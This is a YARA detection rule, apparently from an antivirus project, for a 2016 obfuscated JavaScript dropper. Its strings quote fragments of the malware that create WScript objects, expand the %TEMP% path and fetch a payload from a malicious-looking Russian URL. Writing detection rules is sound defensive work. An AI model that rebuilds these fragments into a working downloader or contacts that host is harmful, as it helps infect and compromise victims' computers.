rule sig_20160428_b48bd90a1a881d1648b7def89ec2c9ee {
  meta:
    description = "datamaliciousorder - file 20160428_b48bd90a1a881d1648b7def89ec2c9ee.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5769848109b28b9d0fddf8fe0fcc4cbf31115a623f9c090314225abf30bd235a"

  strings:
    $s1  = "function NvuBeaPssHckNtzKkqSct(JaeQmqQgkNunNjtKyjUwl){TybPjoQbgWykKlnTivSsu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function NvuBeaPssHckNtzKkqSct(JaeQmqQgkNunNjtKyjUwl){TybPjoQbgWykKlnTivSsu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function FyjOgiOsjNbtFctUlpTux() {return TybPjoQbgWykKlnTivSsu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function VraPilXanXusPklIxlPyf(JmaQsrTjrPnkVvtHyfRrq, IeeYsyYigGiwMkhIuvTle){CvvFlnGfgDrtRpfRfmInm = CvvFlnGfgDrtRpfRfmInm * 1; " ascii
    $s5  = "var TybPjoQbgWykKlnTivSsu = function UlnUfgHzyGloYljWvzTjc() {return ZrpZomFsaFzeSmeAskUhq[TugMgkWznSkxYmdUmlMdt](\"WScript\"+\"" ascii
    $s6  = "return JmaQsrTjrPnkVvtHyfRrq - IeeYsyYigGiwMkhIuvTle;};" fullword ascii
    $s7  = "LoxLchGszAqdYxbVycXzf[XfcBsfJkfOjoZwcXelZrs](\"G\" + \"ET\", \"http://zahariev.myjino.ru/n8sja\", false);" fullword ascii
    $s8  = "var TybPjoQbgWykKlnTivSsu = function UlnUfgHzyGloYljWvzTjc() {return ZrpZomFsaFzeSmeAskUhq[TugMgkWznSkxYmdUmlMdt](\"WScript\"+\"" ascii
    $s9  = "var ZrpZomFsaFzeSmeAskUhq = this[\"WScript\"];" fullword ascii
    $s10 = "function FyjOgiOsjNbtFctUlpTux() {return TybPjoQbgWykKlnTivSsu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (LoxLchGszAqdYxbVycXzf[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function VraPilXanXusPklIxlPyf(JmaQsrTjrPnkVvtHyfRrq, IeeYsyYigGiwMkhIuvTle){CvvFlnGfgDrtRpfRfmInm = CvvFlnGfgDrtRpfRfmInm * 1; " ascii
    $s13 = "function JznOxgGzaRerOrvOesFvj(){return PyhWocZzjXixQiyLddLpl + \"\";};" fullword ascii
    $s14 = "function VkhFpaCepAkiFlrHtiOpc() {return ((RzkVmuZzqGoaJltJpxRfb == true) && (RzkVmuZzqGoaJltJpxRfb == FstRglRfwHezGkmItwTrs)) ?" ascii
    $s15 = "function VkhFpaCepAkiFlrHtiOpc() {return ((RzkVmuZzqGoaJltJpxRfb == true) && (RzkVmuZzqGoaJltJpxRfb == FstRglRfwHezGkmItwTrs)) ?" ascii
    $s16 = "UagGgfGjyXsqIibJbrHkj = true;" fullword ascii
    $s17 = "function MzpCjnNdbGxuUmqGnmXuy()" fullword ascii
    $s18 = "function RzjOnsCktFbpXmlQkdKih(){return TugMgkWznSkxYmdUmlMdt;};" fullword ascii
    $s19 = "var UagGgfGjyXsqIibJbrHkj = false;" fullword ascii
    $s20 = "var FstRglRfwHezGkmItwTrs = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}